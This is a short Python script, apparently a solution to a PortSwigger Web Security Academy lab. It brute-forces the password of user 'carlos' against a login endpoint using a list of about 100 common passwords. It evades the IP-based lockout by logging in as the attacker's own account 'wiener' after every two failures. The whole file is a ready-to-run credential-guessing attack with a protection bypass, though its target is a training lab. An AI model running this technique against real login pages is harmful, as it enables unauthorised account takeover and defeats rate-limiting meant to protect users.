import requests

session = requests.Session()

url = 'https://0a30003d033b1fe8809c67a200b300a6.web-security-academy.net/login'
sayac = 0

passwordlist = [
    "123456", "password", "12345678", "qwerty", "123456789", "12345", "1234", 
    "111111", "1234567", "dragon", "123123", "baseball", "abc123", "football", 
    "monkey", "letmein", "shadow", "master", "666666", "qwertyuiop", "123321", 
    "mustang", "1234567890", "michael", "654321", "superman", "1qaz2wsx", 
    "7777777", "121212", "000000", "qazwsx", "123qwe", "killer", "trustno1", 
    "jordan", "jennifer", "zxcvbnm", "asdfgh", "hunter", "buster", "soccer", 
    "harley", "batman", "andrew", "tigger", "sunshine", "iloveyou", "2000", 
    "charlie", "robert", "thomas", "hockey", "ranger", "daniel", "starwars", 
    "klaster", "112233", "george", "computer", "michelle", "jessica", "pepper", 
    "1111", "zxcvbn", "555555", "11111111", "131313", "freedom", "777777", 
    "pass", "maggie", "159753", "aaaaaa", "ginger", "princess", "joshua", 
    "cheese", "amanda", "summer", "love", "ashley", "nicole", "chelsea", 
    "biteme", "matthew", "access", "yankees", "987654321", "dallas", "austin", 
    "thunder", "taylor", "matrix", "mobilemail", "mom", "monitor", "monitoring", 
    "montana", "moon", "moscow"
]


for password in passwordlist:
    veriler = {'username': 'carlos', 'password': password}

    cevap = session.post(url, data=veriler)

    if "Incorrect password" in cevap.text:
        print("Hesaba Giriş Yapılamadı")

        sayac += 1

        if sayac >= 2:
            ipResetveri = {'username': 'wiener', 'password': 'peter'}

            session.post(url, data=ipResetveri)

            sayac = 0
    elif "Gateway Timeout" in cevap.text:
        print("Bir Hata Oluştu")

        break
    
    else:
        print(f"Hesaba Giriş Yapıldı Hesap Şifresi: {password}")
        
        break


